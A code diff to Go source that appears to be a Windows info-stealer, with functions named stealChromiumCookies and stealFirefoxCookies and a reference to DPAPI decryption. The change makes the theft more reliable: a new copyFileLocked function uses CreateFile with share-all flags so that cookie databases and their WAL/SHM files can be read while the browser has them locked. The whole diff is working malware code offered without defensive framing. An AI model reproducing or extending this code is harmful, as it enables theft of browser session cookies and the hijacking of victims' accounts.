@@ -84,9 +84,15 @@ func stealChromiumCookies(userDataPath string, browserName string) (string, []st
 		}
 
 		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_cookies_%s_%s_%d", browserName, profile, time.Now().UnixNano()))
-		copyFileSimple(cookiePath, tmpPath)
-		copyFileSimple(cookiePath+"-wal", tmpPath+"-wal")
-		copyFileSimple(cookiePath+"-shm", tmpPath+"-shm")
+
+		if err := copyFileLocked(cookiePath, tmpPath); err != nil {
+			errs = append(errs, fmt.Sprintf("%s/%s copy: %v", browserName, profile, err))
+			continue
+		}
+		// Try to copy WAL/SHM if they exist, but don't fail if they don't, or if copy fails
+		_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal")
+		_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm")
+
 		defer os.Remove(tmpPath)
 		defer os.Remove(tmpPath + "-wal")
 		defer os.Remove(tmpPath + "-shm")
@@ -152,9 +158,14 @@ func stealFirefoxCookies(profilesPath string) (string, []string) {
 		}
 
 		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_ff_cookies_%s_%d", e.Name(), time.Now().UnixNano()))
-		copyFileSimple(cookiePath, tmpPath)
-		copyFileSimple(cookiePath+"-wal", tmpPath+"-wal")
-		copyFileSimple(cookiePath+"-shm", tmpPath+"-shm")
+
+		if err := copyFileLocked(cookiePath, tmpPath); err != nil {
+			errs = append(errs, fmt.Sprintf("firefox/%s copy: %v", e.Name(), err))
+			continue
+		}
+		_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal")
+		_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm")
+
 		defer os.Remove(tmpPath)
 		defer os.Remove(tmpPath + "-wal")
 		defer os.Remove(tmpPath + "-shm")
@@ -316,12 +327,37 @@ func dpapiDecrypt(data []byte) ([]byte, error) {
 	return result, nil
 }
 
-func copyFileSimple(src, dst string) {
-	data, err := os.ReadFile(src)
+func copyFileLocked(src, dst string) error {
+	srcW, _ := syscall.UTF16PtrFromString(src)
+	const genericRead = 0x80000000
+	const fileShareAll = 0x1 | 0x2 | 0x4
+	const openExisting = 3
+	const fileAttrNormal = 0x80
+
+	h, err := syscall.CreateFile(srcW, genericRead, fileShareAll, nil, openExisting, fileAttrNormal, 0)
 	if err != nil {
-		return
+		return fmt.Errorf("open %s: %w", src, err)
 	}
-	_ = os.WriteFile(dst, data, 0o644)
+	defer syscall.CloseHandle(h)
+
+	var size int64
+	hi := uint32(0)
+	lo, err := syscall.GetFileSize(h, &hi)
+	if err == nil {
+		size = int64(hi)<<32 | int64(lo)
+	}
+
+	if size == 0 {
+		return fmt.Errorf("empty %s", src)
+	}
+
+	data := make([]byte, size)
+	var read uint32
+	err = syscall.ReadFile(h, data, &read, nil)
+	if err != nil {
+		return fmt.Errorf("read %s: %w", src, err)
+	}
+	return os.WriteFile(dst, data[:read], 0o644)
 }
 `)
 }
